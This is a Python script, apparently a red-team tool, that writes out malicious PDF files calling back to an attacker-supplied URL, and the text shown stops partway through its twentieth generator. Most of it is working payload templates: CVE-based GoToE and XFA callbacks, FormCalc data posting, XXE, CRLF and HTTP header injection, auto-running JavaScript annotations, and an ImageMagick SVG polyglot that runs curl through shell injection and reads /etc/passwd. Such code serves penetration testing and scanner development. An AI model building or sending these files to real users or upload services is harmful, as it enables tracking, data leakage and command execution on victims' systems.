#!/usr/bin/python
# -*- coding: UTF-8 -*-
##
## Generate 29 malicious PDF files with phone-home functionality
## Used for penetration testing and/or red-teaming etc
##
## Usage: python3 malicious-pdf.py <callback-url>
##
## Output will be written to the output/ directory as test1.pdf, test2.pdf, etc.
##
## Based on https://github.com/modzero/mod0BurpUploadScanner/ and https://github.com/deepzec/Bad-Pdf
##
## Jonas Lejon, 2023-2026 <jonas.github@triop.se>
## https://github.com/jonaslejon/malicious-pdf

import sys
import bz2
import base64
import ipaddress
import validators
import os
import argparse
from pathlib import Path

KNOWN_SCHEMES = ('http://', 'https://', 'ftp://', 'ftps://', 'file://', 'smb://',
                  'ssh://', 'telnet://', 'gopher://', 'ldap://', 'mailto:', 'news:',
                  'nntp://', 'irc://', 'data:', 'javascript:')


def validate_url_or_ip_validators(input_string):
    """Validates if input is an IP address or a URL with a scheme."""

    # 1. Check for IP address first
    try:
        ipaddress.ip_address(input_string)
        return True
    except ValueError:
        pass # Not a valid IP, continue to URL/domain checks

    # 2. Check for URL with any scheme (http, https, ftp, etc.)
    # validators.url() by default only accepts http/https, so we need to check for other schemes
    if validators.url(input_string):
        return True

    # 3. Check if it has a scheme prefix for other protocols
    for scheme in KNOWN_SCHEMES:
        if input_string.lower().startswith(scheme):
            # Basic validation: ensure there's something after the scheme
            if len(input_string) > len(scheme):
                return True

    return False


def ensure_scheme(host):
    """Add https:// if the host has no recognized scheme (e.g. bare IP address)."""
    if not host.lower().startswith(KNOWN_SCHEMES):
        return f'https://{host}'
    return host


# This is CVE-2018-4993
# From https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
def create_malpdf(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R

   /AA <<
	   /O <<
	      /F (''' + host + ''')
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>

	   >>

	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj


4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj


trailer
<<
	/Root 1 0 R
>>

%%EOF
''')


def create_malpdf2(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="Hello World!">
            <event activity="docReady" ref="$host" name="event__click">
               <submit
                     textEncoding="UTF-16"
                     xdpContent="pdf datasets xfdf"
                     target="''' + host + '''"/>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')

#a pdf file where javascript code is evaluated for execution
# % BSD Licence, Ange Albertini, 2011
def create_malpdf3(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      eval(
          'app.openDoc({cPath: encodeURI("''' + host +'''"), cFS: "CHTTP" });'
          );
      )
      >>
  >>
>>''')

# Adobe Reader - PDF callback via XSLT stylesheet in XFA
# CVE-2019-7089
# From: https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html
def create_malpdf4(filename, host):
    with open(filename, "w") as file:
        file.write(r'''%PDF-

1 0 obj <<>>
stream
<?xml version="1.0" ?>
<?xml-stylesheet href="\\\\''' + host + r'''\whatever.xslt" type="text/xsl" ?>
endstream
endobj
trailer <<
    /Root <<

        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>
''')

## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf5(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'uri'     ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /URI
     /URI (''' + host + '''/test5)
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
854
%%EOF
''')

## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch2.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf6(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'launch'  ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /Launch
     /F << /Type /FileSpec /F (''' + host + '''/test6.pdf) /V true /FS /URL >>
     /NewWindow false
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
922
%%EOF
''')

## Testcase from ./02-exploits/25-firefox-browser/02-disclosure-01-url-invocation-dns-prefetch3.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf7(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'gotor'   ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /GoToR
     /F << /Type /FileSpec /F ('''+host+'''/test7.pdf) /V true /FS /URL >>
     /NewWindow false
     /D [0 /Fit]
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000629 00000 n
0000000749 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
937
%%EOF
''')

## Testcase from ./02-exploits/15-masterpdf-editor/02-disclosure-01-url-invocation.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf8(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /OpenAction 5 0 R
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'form'    ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /SubmitForm
     /F << /Type /FileSpec /F ('''+host+'''/test8.pdf) /V true /FS /URL >>
     /Flags 4 % SubmitHTML
   % /Flags 32 % SubmitXFDF
   % /Flags 256 % SubmitPDF
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000187 00000 n
0000000288 00000 n
0000000553 00000 n
0000000673 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
908
%%EOF
''')

## Testcase from 01-testsuite/02-disclosure/01-url-invocation/data-link.pdf
## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
def create_malpdf9(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Open true
                 /A 5 0 R
                 /H /N
                 /Rect [0 0 595 842]
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'data'    ) Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Action
     /S /ImportData
     /F << /Type /FileSpec /F ('''+host+'''/test9.pdf) /V true /FS /URL >>
  >>
endobj

xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000164 00000 n
0000000265 00000 n
0000000724 00000 n
0000000844 00000 n
trailer
  << /Root 1 0 R
     /Size 6
  >>
startxref
997
%%EOF
''')

# Foxit PDF Reader PoC, macOS version "patch gap" : CVE-2017-10951
# Source: https://twitter.com/l33d0hyun/status/1448342241647366152
# Uses this.getURL() to trigger a callback via Foxit Reader's JavaScript engine
def create_malpdf10(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>>
2 0 obj
<</S /JavaScript /JS (
this.getURL("''' + host + '''/test10")
)>> trailer <</Root 1 0 R>>''')

# Eicar test file embedded in PDF. Source: https://github.com/fire1ce/eicar-standard-antivirus-test-files
# Created by Stas Yakobov
def create_malpdf11(filename):
    eicar = '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'
    with open(filename, "wb") as file:
        file.write(bz2.decompress(base64.b64decode(eicar)))

# FormCalc GET/POST data exfiltration via XFA
# CVE-2014-8453 - FormCalc same-origin policy bypass
# FormCalc's Post() and GET() functions execute in the browser context with session cookies
# Source: https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html
def create_malpdf12(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="FormCalc Exfil">
            <event activity="initialize">
                <script contentType='application/x-formcalc'>
                    Post("''' + host + '''/test12","formcalc-callback","text/plain","utf-8","")
                </script>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')

# Client-side request injection via CRLF in XFA textEncoding attribute
# Injects newlines into POST requests, allowing HTTP header manipulation
# Source: https://insert-script.blogspot.com/2018/05/adobe-reader-pdf-client-side-request.html
def create_malpdf13(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="CRLF Inject">
            <event activity="docReady" ref="$host" name="event__click">
               <submit
                     textEncoding="UTF-16&#xD;&#xA;X-Injected: true&#xD;&#xA;"
                     xdpContent="pdf datasets xfdf"
                     target="''' + host + '''/test13"/>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')

# ImageMagick shell injection via SVG-MSL polyglot
# Exploits unsafe password handling in ImageMagick's PDF coder (Ghostscript delegate)
# The SVG self-references as MSL, triggering the authenticate attribute injection
# Targets server-side ImageMagick processing of uploaded files
# Source: https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html
def create_malpdf14(filename, host):
    basename = os.path.basename(str(filename))
    with open(filename, "w") as file:
        file.write('''<image authenticate='ff" `curl ''' + host + '''/test14`;"'>
  <read filename="pdf:/etc/passwd"/>
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="msl:''' + basename + '''" height="100" width="100"/>
  </svg>
</image>
''')

# FormCalc POST with arbitrary HTTP header injection via XFA
# The 5th parameter of FormCalc's Post() function allows setting arbitrary HTTP headers
# Can override Host, Content-Type, Referer and other normally restricted headers
# Source: https://insert-script.blogspot.com/2015/05/pdf-mess-with-web.html
def create_malpdf15(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1
1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="Header Inject">
            <event activity="initialize">
                <script contentType='application/x-formcalc'>
                    Post("''' + host + '''/test15","header-inject-test","text/plain","utf-8","Content-Type: text/html&#x0d;&#x0a;X-Injected: true&#x0d;&#x0a;")
                </script>
            </event>
</field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj
trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>''')

# GotoE action with javascript: URI for browser XSS
# When a PDF is loaded via <embed> or <object> tags, the GotoE action can execute
# javascript: URIs in the embedding page's security context
# Source: https://insert-script.blogspot.com/2015/05/pdf-mess-with-web.html
def create_malpdf16(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R

   /AA <<
	   /O <<
	      /F (javascript:new Image().src="''' + host + '''/test16")
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>

	   >>

	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj


4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(GotoE JS Test) Tj
ET
endstream
endobj


trailer
<<
	/Root 1 0 R
>>

%%EOF
''')

# XXE via XMLData.parse() in PDF JavaScript
# CVE-2014-8452 - Adobe Reader processes external XML entities via JavaScript XML functions
# Triggers external entity resolution causing a network callback
# Source: https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html
def create_malpdf17(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(
      try {
          XMLData.parse('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "''' + host + '''/test17">]><root>&xxe;</root>', false, true);
      } catch(e) {}
      )
      >>
  >>
>>''')


# PortSwigger Research: Annotation URI Injection with JavaScript action
# Demonstrates injection via unescaped parentheses in annotation URI fields
# Exploits PDF-Lib and jsPDF which fail to escape parentheses
# Duplicate /A key in annotation dict - second (JavaScript) overrides first (URI)
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf18(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Link
                 /Rect [0 0 595 842]
                 /A << /S /URI /URI (blah) >>
                 /A << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test18"), cFS: "CHTTP"})) /Type /Action >>
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'annot-inject') Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000850 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
970
%%EOF
''')


# PortSwigger Research: PV (Page Visible) auto-execution
# Screen annotation fires JavaScript automatically when page becomes visible
# No user interaction required - targets Acrobat Reader
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf19(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [<< /Type /Annot
                 /Subtype /Screen
                 /Rect [0 0 900 900]
                 /AA << /PV << /S /JavaScript /JS (app.openDoc({cPath: encodeURI("''' + host + '''/test19"), cFS: "CHTTP"})) >> >>
              >>]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'pv-auto'     ) Tj
  ET
endstream
endobj

xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000069 00000 n
0000000170 00000 n
0000000820 00000 n
trailer
  << /Root 1 0 R
     /Size 5
  >>
startxref
940
%%EOF
''')


# PortSwigger Research: PC (Page Close) triggered execution
# Annotation fires JavaScript when the page or document is closed
# No user interaction required - targets Acrobat Reader
# Source: https://portswigger.net/research/portable-data-exfiltration
def create_malpdf20(filename, host):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
